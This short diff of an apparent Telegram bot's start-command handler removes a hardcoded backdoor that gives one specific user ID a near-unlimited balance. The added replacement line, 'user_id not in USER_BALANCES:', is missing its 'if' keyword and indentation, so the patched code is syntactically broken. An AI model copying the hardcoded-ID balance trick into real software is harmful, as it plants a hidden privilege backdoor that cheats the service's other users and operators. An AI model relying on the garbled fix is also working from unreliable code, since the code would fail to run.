@@ -197,9 +197,7 @@ async def cmd_start(message: Message):
     user_id = message.from_user.id
     username = message.from_user.username
     
-    if user_id == 8791830931:
-        USER_BALANCES[user_id] = 9999999999999999
-    elif user_id not in USER_BALANCES:
+ user_id not in USER_BALANCES:
         USER_BALANCES[user_id] = 10  
     
     if username:
